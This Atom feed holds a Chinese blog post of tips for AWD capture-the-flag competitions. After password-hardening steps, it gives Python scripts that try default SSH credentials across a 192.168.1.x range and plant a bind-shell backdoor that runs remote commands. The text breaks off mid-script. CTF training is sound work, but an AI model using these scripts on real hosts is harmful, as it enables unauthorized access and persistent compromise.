<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://blog.xcu.icu</id>
    <title></title>
    <subtitle></subtitle>
    <icon>https://blog.xcu.icu/images/favicon.ico</icon>
    <link href="https://blog.xcu.icu" />
    <author>
      <name>Clown</name>
    </author>
    <updated>2022-10-23T16:00:00.000Z</updated>
    <category term="Clown" />
    <category term="Web" />
    <category term="Pwn" />
    <category term="CTF" />
    <category term="AWD" />
    <category term="ACM" />
    <entry>
        <id>https://blog.xcu.icu/2022/10/24/awd-web%E5%B0%8F%E7%BB%93/</id>
        <title>Awd-web小结</title>
        <link rel="alternate" href="https://blog.xcu.icu/2022/10/24/awd-web%E5%B0%8F%E7%BB%93/"/>
        <content type="html">&lt;h2 id=&#34;查看比赛信息-规则&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看比赛信息-规则&#34;&gt;#&lt;/a&gt; 查看比赛信息、规则&lt;/h2&gt;
&lt;p&gt;注意赛方的限制比如说提交 flag 的间隔时间，flag 的获取方式，通防的限制，对后门的处理要求等要注意的点，避免 check 丢分&lt;/p&gt;
&lt;h2 id=&#34;改密码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#改密码&#34;&gt;#&lt;/a&gt; 改密码&lt;/h2&gt;
&lt;p&gt;awd 模式每个队伍会有若干台服务器需要维护，如果主办方平台给的密码较为简单存在弱口令或者可能被爆破成功的机会，尽快修改密码，密码主要是三个方面：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ssh 连接密码即本地密码&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-ABAP&#34; data-language=&#34;ABAP&#34;&gt;&lt;code class=&#34;language-ABAP&#34;&gt;passwd &amp;#123;用户名&amp;#125;
做修改即可&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;MySQL 登录密码&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-apl&#34; data-language=&#34;apl&#34;&gt;&lt;code class=&#34;language-apl&#34;&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token dyadic-operator operator&#34;&gt;.&lt;/span&gt; 使用 SET PASSWORD 命令
步骤 &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;：输入命令mysql &lt;span class=&#34;token function&#34;&gt;-&lt;/span&gt;u root &lt;span class=&#34;token function&#34;&gt;-&lt;/span&gt;p指定 root 用户登录 MySQL，输入后按回车键输入密码。如果没有配置环境变量，请在 MySQL 的 bin 目录下登录操作。

步骤 &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;：使用 SET PASSWORD 修改密码命令格式为 set password for username &lt;span class=&#34;token dyadic-operator operator&#34;&gt;@&lt;/span&gt;localhost &lt;span class=&#34;token function&#34;&gt;=&lt;/span&gt; password&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;newpwd&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
，其中 username 为要修改密码的用户名，newpwd 为要修改的新密码。

&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token dyadic-operator operator&#34;&gt;.&lt;/span&gt; 使用mysqladmin修改密码
使用 mysqladmin 命令修改 MySQL 的 root 用户密码格式为 mysqladmin &lt;span class=&#34;token function&#34;&gt;-&lt;/span&gt;u用户名 &lt;span class=&#34;token function&#34;&gt;-&lt;/span&gt;p旧密码 password 新密码。

注意：修改密码的命令中 &lt;span class=&#34;token function&#34;&gt;-&lt;/span&gt;uroot 和 &lt;span class=&#34;token function&#34;&gt;-&lt;/span&gt;proot 是整体，不要写成 &lt;span class=&#34;token function&#34;&gt;-&lt;/span&gt;u root &lt;span class=&#34;token function&#34;&gt;-&lt;/span&gt;p root，&lt;span class=&#34;token function&#34;&gt;-&lt;/span&gt;u 和 root 间可以加空格，但是会有警告出现，所以就不要加空格了。

&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token dyadic-operator operator&#34;&gt;.&lt;/span&gt; UPDATE直接编辑user表
步骤 &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;：输入命令mysql &lt;span class=&#34;token function&#34;&gt;-&lt;/span&gt;u root &lt;span class=&#34;token function&#34;&gt;-&lt;/span&gt;p指定 root 用户登录 MySQL，输入后按回车键输入密码。如果没有配置环境变量，请在 MySQL 的 bin 目录下登录操作。

步骤 &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;：输入use mysql&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;命令连接权限数据库。

步骤 &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;：输入命令update mysql&lt;span class=&#34;token dyadic-operator operator&#34;&gt;.&lt;/span&gt;user set authentication_string&lt;span class=&#34;token function&#34;&gt;=&lt;/span&gt;password&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;新密码&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; where user&lt;span class=&#34;token function&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;用户名&#39;&lt;/span&gt; and Host &lt;span class=&#34;token function&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;localhost&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;设置新密码。

步骤 &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;：输入 flush privileges&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; 命令刷新权限。

步骤 &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;：输入quit&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;命令退出 MySQL 重新登录，此时密码已经修改为刚才输入的新密码了。&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;后台的登录密码&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-ASN.1&#34; data-language=&#34;ASN.1&#34;&gt;&lt;code class=&#34;language-ASN.1&#34;&gt;updata admin set user pass&amp;#x3D;’123456’;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;如果密码是默认的尝试别人的能否登录&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;#-*- coding:utf-8 -*-&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; paramiko

ip &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;192.168.1.137&#39;&lt;/span&gt;
port &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;22&#39;&lt;/span&gt;
username &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;root&#39;&lt;/span&gt;
passwd &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;toor&#39;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# ssh 用户名 密码 登陆&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;ssh_base_pwd&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ip&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;port&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;passwd&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;cmd&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;ls&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    port &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;port&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    ssh &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; paramiko&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;SSHClient&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

    ssh&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;set_missing_host_key_policy&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;paramiko&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;AutoAddPolicy&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

    ssh&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;connect&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;hostname&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;ip&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; port&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;port&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; username&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; password&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;passwd&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

    stdin&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;stdout&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;stderr &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; ssh&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;exec_command&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;cmd&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

    result &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; stdout&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;read&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;not&lt;/span&gt; result &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;无结果!&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        result &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; stderr&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;read&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    ssh&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;close&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    
    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; result&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;decode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    
a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; ssh_base_pwd&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ip&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;port&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;passwd&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;如果可以登录而且有 python 环境可以尝试使用下面这个 python 批量 ssh 登录并反弹 python shell&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;#-*- coding:utf-8 -*-&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; paramiko
&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; threading
&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; queue
&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; time
&lt;span class=&#34;token comment&#34;&gt;#反弹 shell python&lt;/span&gt;

q&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;queue&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Queue&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#lock = threading.Lock()&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# ssh 用户名 密码 登陆&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;ssh_base_pwd&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ip&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;port&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;passwd&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;cmd&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    port &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;port&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    ssh &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; paramiko&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;SSHClient&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

    ssh&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;set_missing_host_key_policy&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;paramiko&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;AutoAddPolicy&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

    ssh&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;connect&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;hostname&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;ip&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; port&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;port&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; username&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; password&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;passwd&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

    stdin&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;stdout&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;stderr &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; ssh&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;exec_command&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;cmd&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

    result &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; stdout&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;read&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;not&lt;/span&gt; result &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        result &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; stderr&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;read&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    ssh&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;close&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    
    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; result&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;decode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    shell &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
    #服务器端
    import socket
    import os
    s=socket.socket()   #创建套接字 #s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    s.bind((&#39;0.0.0.0&#39;,1234))    #绑定地址和端口#0.0.0.0接收任意客户端ip连接
    s.listen(5)                 #调用listen方法开始监听端口，传入的参数为等待连接的最大数量
    con,addr=s.accept()     #接受一个客户端的连接
    #print(con,addr)

    for i in range(10):
        cmd=con.recv(1024)
        print(cmd)
        command=cmd.decode()
        if command.startswith(&#39;cd&#39;):
            os.chdir(command[2:].strip())   #切换路径
            result=os.getcwd()      #显示路径
        else:
            result=os.popen(command).read()
        if result:
            con.send(result.encode())
        else:
            con.send(b&#39;OK!&#39;)
    &#39;&#39;&#39;&lt;/span&gt;
    cmd &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;echo \&#34;%s\&#34; &gt; ./shell.py&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;shell&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&amp;amp;&amp;amp; python3 ./shell.py&#39;&lt;/span&gt;
    port &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;22&#39;&lt;/span&gt;
    username &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;root&#39;&lt;/span&gt;
    passwd &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;toor&#39;&lt;/span&gt;
    
    ip &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;192.168.1.&amp;#123;&amp;#125;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    q&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;put&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ip&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;strip&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;block&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; timeout&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;None&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    ip_demo&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;q&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;get&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token comment&#34;&gt;#判断是否成功&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token comment&#34;&gt;#lock.acquire()&lt;/span&gt;
        res &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; ssh_base_pwd&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ip_demo&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;port&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;passwd&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;cmd&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;id&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; res&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;[ + ]Ip: %s&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; ip_demo &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34; is success!!! [ + ]&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;token comment&#34;&gt;#lock.release()&lt;/span&gt;
            ssh_base_pwd&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ip_demo&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;port&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;passwd&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;cmd&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;except&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;[ - ]Ip: %s&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; ip_demo &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34; is Failed&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; x &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;255&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Finshed!!!!!!!!&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    q&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;task_done&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    
&lt;span class=&#34;token comment&#34;&gt;#线程队列部分&lt;/span&gt;
th&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
th_num&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;255&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;th_num&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
